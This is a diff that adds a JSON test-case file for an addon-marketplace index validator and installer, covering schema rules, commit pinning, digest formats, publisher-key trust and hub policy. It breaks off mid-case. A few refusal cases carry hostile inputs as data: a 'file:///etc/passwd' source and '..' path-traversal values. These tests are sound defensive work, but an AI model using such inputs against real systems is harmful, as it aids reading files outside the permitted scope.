@@ -1,0 +1,3846 @@
+{
+ "cases": [
+  {
+   "args": {
+    "index": {
+     "addons": [],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "index",
+   "expect": {
+    "ok": {
+     "addons": []
+    }
+   },
+   "name": "index_valid_minimal"
+  },
+  {
+   "args": {
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      },
+      {
+       "api": ">=1.0,<2",
+       "capabilities": [
+        "network",
+        "serve_http"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "jira",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:50383dc9e008e3a6cde3a80b1d772cd30a53a1d9de466893af42d8fb7b9ad0ac",
+       "publisher": {
+        "key": "BBmy74NSZ2uabtb5xyo1ERHf65Yu_mYZXuuszXk2UPyX_gElcXlNAPLDd6mJgVaqwTsULdeMeUFZ0DWZZ8HN9XQ",
+        "sig": "D9W4Dfp80WNURbeMl6uYBHVQtBFL6ifQQfSilKX6XajD5l1JQu0ocJrO2RIzF7gCFx3VuuLk5LpdWHS51ZO5Ig"
+       },
+       "runtime": {
+        "kind": "python-requirements",
+        "lock": "requirements.txt"
+       },
+       "source": {
+        "git": "https://github.com/acme/jira",
+        "subdir": "pkg"
+       },
+       "summary": "Jira tickets as orch tickets",
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "index",
+   "expect": {
+    "ok": {
+     "addons": [
+      "standup",
+      "jira"
+     ]
+    }
+   },
+   "name": "index_valid_full"
+  },
+  {
+   "args": {
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "extra": 1,
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "index",
+   "expect": {
+    "refuse": "market.malformed"
+   },
+   "name": "index_unknown_top_field"
+  },
+  {
+   "args": {
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "homepage": "https://x.example",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "index",
+   "expect": {
+    "refuse": "market.malformed"
+   },
+   "name": "index_unknown_entry_field"
+  },
+  {
+   "args": {
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/2",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "index",
+   "expect": {
+    "refuse": "market.malformed"
+   },
+   "name": "index_wrong_format"
+  },
+  {
+   "args": {
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "http://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "index",
+   "expect": {
+    "refuse": "market.malformed"
+   },
+   "name": "index_http_source"
+  },
+  {
+   "args": {
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "file:///etc/passwd",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "index",
+   "expect": {
+    "refuse": "market.malformed"
+   },
+   "name": "index_file_source"
+  },
+  {
+   "args": {
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/..",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "index",
+   "expect": {
+    "refuse": "market.malformed"
+   },
+   "name": "index_dotdot_source_segment"
+  },
+  {
+   "args": {
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "../x"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "index",
+   "expect": {
+    "refuse": "market.malformed"
+   },
+   "name": "index_subdir_dotdot"
+  },
+  {
+   "args": {
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "root"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "index",
+   "expect": {
+    "refuse": "market.malformed"
+   },
+   "name": "index_unknown_capability"
+  },
+  {
+   "args": {
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "pty",
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "index",
+   "expect": {
+    "refuse": "market.malformed"
+   },
+   "name": "index_capabilities_unsorted"
+  },
+  {
+   "args": {
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "latest",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "index",
+   "expect": {
+    "refuse": "market.malformed"
+   },
+   "name": "index_bad_min_orch"
+  },
+  {
+   "args": {
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 0
+    }
+   },
+   "check": "index",
+   "expect": {
+    "refuse": "market.malformed"
+   },
+   "name": "index_version_zero"
+  },
+  {
+   "args": {
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "index",
+   "expect": {
+    "refuse": "market.bad_digest_format"
+   },
+   "name": "index_bad_sha_short"
+  },
+  {
+   "args": {
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "index",
+   "expect": {
+    "refuse": "market.bad_digest_format"
+   },
+   "name": "index_bad_sha_uppercase"
+  },
+  {
+   "args": {
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha1:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "index",
+   "expect": {
+    "refuse": "market.bad_digest_format"
+   },
+   "name": "index_bad_sha_algorithm"
+  },
+  {
+   "args": {
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "index",
+   "expect": {
+    "refuse": "market.unpinned"
+   },
+   "name": "index_missing_pin"
+  },
+  {
+   "args": {
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "main",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "index",
+   "expect": {
+    "refuse": "market.unpinned"
+   },
+   "name": "index_branch_as_pin"
+  },
+  {
+   "args": {
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "index",
+   "expect": {
+    "refuse": "market.unpinned"
+   },
+   "name": "index_abbreviated_pin"
+  },
+  {
+   "args": {
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      },
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "index",
+   "expect": {
+    "refuse": "market.duplicate_id"
+   },
+   "name": "index_duplicate_id"
+  },
+  {
+   "args": {
+    "index": "{\"addons\": [{\"capabilities\": [\"network\"], \"commit\": \"0123456789abcdef0123456789abcdef01234567\", \"id\": \"standup\", \"min_orch\": \"2.0.0\", \"package_sha256\": \"sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595\", \"source\": {\"git\": \"https://github.com/acme/standup\", \"subdir\": \"pkg\"}, \"version\": \"1.0.0\"}], \"format\": \"orch.market/1\", \"name\": \"acme-market\", \"source\": {\"git\": \"https://github.com/acme/orch-market\"}, \"version\": 7, \"version\": 8}"
+   },
+   "check": "index",
+   "expect": {
+    "refuse": "market.malformed"
+   },
+   "name": "index_duplicate_json_key"
+  },
+  {
+   "args": {
+    "index": "{\"addons\": [{\"capabilities\": [\"network\"], \"commit\": \"0123456789abcdef0123456789abcdef01234567\", \"id\": \"standup\", \"min_orch\": \"2.0.0\", \"package_sha256\": \"sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595\", \"source\": {\"git\": \"https://github.com/acme/standup\", \"subdir\": \"pkg\"}, \"version\": \"1.0.0\"}], \"format\": \"orch.market/1\", \"name\": \"acme-market\", \"source\": {\"git\": \"https://github.com/acme/orch-market\"}, \"version\": 7.0}"
+   },
+   "check": "index",
+   "expect": {
+    "refuse": "market.malformed"
+   },
+   "name": "index_float_number"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"standup\", \"schema\": \"orch.addon/3\", \"title\": \"Standup\", \"version\": \"1.0.0\"}"
+    },
+    "id": "standup",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "standup",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+       "source": {
+        "git": "https://github.com/acme/standup",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "ok": {
+     "class": "other",
+     "id": "standup",
+     "package_sha256": "sha256:d2c8be3f4051ae57c32bb2c2ff6b46bff268f1e2626217d565bed43acc123595",
+     "tofu": "unsigned",
+     "version": "1.0.0"
+    }
+   },
+   "name": "install_ok_other_unsigned"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\", \"serve_http\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"jira\", \"schema\": \"orch.addon/3\", \"title\": \"Jira\", \"version\": \"1.0.0\"}",
+     "requirements.txt": "# generated by uv export\nrequests==2.32.3 \\\n    --hash=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nidna==3.7 --hash=sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n"
+    },
+    "id": "jira",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network",
+        "serve_http"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "jira",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:50383dc9e008e3a6cde3a80b1d772cd30a53a1d9de466893af42d8fb7b9ad0ac",
+       "publisher": {
+        "key": "BBmy74NSZ2uabtb5xyo1ERHf65Yu_mYZXuuszXk2UPyX_gElcXlNAPLDd6mJgVaqwTsULdeMeUFZ0DWZZ8HN9XQ",
+        "sig": "3hXFVFR459upswu9f4IyxbF4yVwIW9OZkmjDaifHBge-fQxQTNNwJmaDZJPAkV7iITJ3C_aLn5gFCYxMmSXaXg"
+       },
+       "runtime": {
+        "kind": "python-requirements",
+        "lock": "requirements.txt"
+       },
+       "source": {
+        "git": "https://github.com/acme/jira",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "ok": {
+     "class": "other",
+     "id": "jira",
+     "package_sha256": "sha256:50383dc9e008e3a6cde3a80b1d772cd30a53a1d9de466893af42d8fb7b9ad0ac",
+     "tofu": "new",
+     "version": "1.0.0"
+    }
+   },
+   "name": "install_ok_tofu_first_use"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {
+      "https://github.com/acme/orch-market|jira": "BBmy74NSZ2uabtb5xyo1ERHf65Yu_mYZXuuszXk2UPyX_gElcXlNAPLDd6mJgVaqwTsULdeMeUFZ0DWZZ8HN9XQ"
+     },
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\", \"serve_http\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"jira\", \"schema\": \"orch.addon/3\", \"title\": \"Jira\", \"version\": \"1.0.0\"}",
+     "requirements.txt": "# generated by uv export\nrequests==2.32.3 \\\n    --hash=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nidna==3.7 --hash=sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n"
+    },
+    "id": "jira",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network",
+        "serve_http"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "jira",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:50383dc9e008e3a6cde3a80b1d772cd30a53a1d9de466893af42d8fb7b9ad0ac",
+       "publisher": {
+        "key": "BBmy74NSZ2uabtb5xyo1ERHf65Yu_mYZXuuszXk2UPyX_gElcXlNAPLDd6mJgVaqwTsULdeMeUFZ0DWZZ8HN9XQ",
+        "sig": "3hXFVFR459upswu9f4IyxbF4yVwIW9OZkmjDaifHBge-fQxQTNNwJmaDZJPAkV7iITJ3C_aLn5gFCYxMmSXaXg"
+       },
+       "runtime": {
+        "kind": "python-requirements",
+        "lock": "requirements.txt"
+       },
+       "source": {
+        "git": "https://github.com/acme/jira",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "ok": {
+     "class": "other",
+     "id": "jira",
+     "package_sha256": "sha256:50383dc9e008e3a6cde3a80b1d772cd30a53a1d9de466893af42d8fb7b9ad0ac",
+     "tofu": "known",
+     "version": "1.0.0"
+    }
+   },
+   "name": "install_ok_tofu_same_key"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"slack\", \"schema\": \"orch.addon/3\", \"title\": \"Slack\", \"version\": \"1.0.0\"}",
+     "package-lock.json": "{\"lockfileVersion\": 3, \"packages\": {\"\": {\"name\": \"x\"}, \"node_modules/left-pad\": {\"integrity\": \"sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\", \"resolved\": \"https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz\", \"version\": \"1.3.0\"}}}"
+    },
+    "id": "slack",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "slack",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:507def4c74bf01347cf0a48be6f0357fcd78a3e64a422fcb0ac2f12fbede74d0",
+       "runtime": {
+        "kind": "node-package-lock",
+        "lock": "package-lock.json"
+       },
+       "source": {
+        "git": "https://github.com/acme/slack",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "acme-market",
+     "source": {
+      "git": "https://github.com/acme/orch-market"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "ok": {
+     "class": "other",
+     "id": "slack",
+     "package_sha256": "sha256:507def4c74bf01347cf0a48be6f0357fcd78a3e64a422fcb0ac2f12fbede74d0",
+     "tofu": "unsigned",
+     "version": "1.0.0"
+    }
+   },
+   "name": "install_ok_node_lock"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": null,
+     "installed": {},
+     "isolation": false,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/severinlindenmann/orch-marketplace",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+      "repo": "https://github.com/severinlindenmann/orch-marketplace"
+     }
+    },
+    "files": {
+     "main.py": "print('hello')\n",
+     "orch-addon.json": "{\"api\": \">=1.0,<2\", \"capabilities\": [\"git_push\", \"network\"], \"entry\": {\"cmd\": [\"python3\", \"{pkg}/main.py\"]}, \"min_core\": \"2.0.0\", \"name\": \"github\", \"schema\": \"orch.addon/3\", \"title\": \"Github\", \"version\": \"1.0.0\"}"
+    },
+    "id": "github",
+    "index": {
+     "addons": [
+      {
+       "capabilities": [
+        "git_push",
+        "network"
+       ],
+       "commit": "0123456789abcdef0123456789abcdef01234567",
+       "id": "github",
+       "min_orch": "2.0.0",
+       "package_sha256": "sha256:5f0c958d357a741a15bbfb9af573ac2152e5b8d60c0a1b44f16d84ed82d53699",
+       "publisher": {
+        "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
+        "sig": "CGMU9z8P4R0aLYLZWBKMOk8tTFX8ebgpzRoca19GRrl_sImxBagoF-FTGarjEK5yxKjuGXhM0UugXDQQOY8ufQ"
+       },
+       "source": {
+        "git": "https://github.com/acme/github",
+        "subdir": "pkg"
+       },
+       "version": "1.0.0"
+      }
+     ],
+     "format": "orch.market/1",
+     "name": "orch-marketplace",
+     "source": {
+      "git": "https://github.com/severinlindenmann/orch-marketplace"
+     },
+     "version": 7
+    }
+   },
+   "check": "install",
+   "expect": {
+    "ok": {
+     "class": "official",
+     "id": "github",
+     "package_sha256": "sha256:5f0c958d357a741a15bbfb9af573ac2152e5b8d60c0a1b44f16d84ed82d53699",
+     "tofu": "new",
+     "version": "1.0.0"
+    }
+   },
+   "name": "install_ok_official_signed"
+  },
+  {
+   "args": {
+    "ctx": {
+     "actor": "human",
+     "builtin": [
+      "wiki",
+      "terminals",
+      "dashboard"
+     ],
+     "core_version": "2.0.1",
+     "hub": {
+      "allow": [
+       "https://github.com/acme/orch-market"
+      ],
+      "block": [],
+      "ceiling": [
+       "network",
+       "serve_http"
+      ]
+     },
+     "installed": {},
+     "isolation": true,
+     "known_keys": {},
+     "last_version": null,
+     "market_repo": "https://github.com/acme/orch-market",
+     "official": {
+      "key": "BNdJxZNU0HJ-R-_ov6V2lqfhRhejlOoCM6GnT3m-a2J1qih4zR2XrvMTGuYMzN91fcn9Hcn8ce7Q-6kS_goxpfc",
